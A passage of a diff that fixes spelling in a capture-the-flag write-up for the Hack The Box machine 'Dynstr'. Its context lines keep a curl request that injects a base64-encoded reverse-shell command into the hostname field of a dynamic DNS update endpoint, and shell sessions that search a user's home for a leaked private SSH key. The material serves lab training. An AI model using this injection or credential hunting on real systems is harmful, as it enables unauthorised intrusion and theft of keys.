@@ -122,7 +122,7 @@ curl 'http://dynadns:sndanyd@dyna.htb/nic/update?hostname=`echo+"YmFzaCAtaSAmPiA
 
 ## DNS pointer record(PTR)
 
-User "bindmgr" have .ssh direcotry which contains ssh key, but can't read pirvate key.
+User "bindmgr" have .ssh directory which contains ssh key, but can't read private key.
 ```bash
 (remote) www-data@dynstr.dyna.htb:/home/bindmgr/.ssh$ ls -l
 total 16
@@ -132,14 +132,14 @@ total 16
 -rw-r--r-- 1 bindmgr bindmgr  444 Mar 13 12:09 known_hosts
 ```
 
-User's home directory contians some debug log in `/home/bindmgr/support-case-C62796521`
+User's home directory contains some debug log in `/home/bindmgr/support-case-C62796521`
 ```bash
 (remote) www-data@dynstr.dyna.htb:/home/bindmgr$ ls -l
 total 8
 drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
 ```
 
-that folder contians some debug output in which, found private ssh key of user "bindmgr"
+that folder contains some debug output in which, found private ssh key of user "bindmgr"
 ```bash
 (remote) www-data@dynstr.dyna.htb:/home/bindmgr/support-case-C62796521$ ls -l 
 total 428
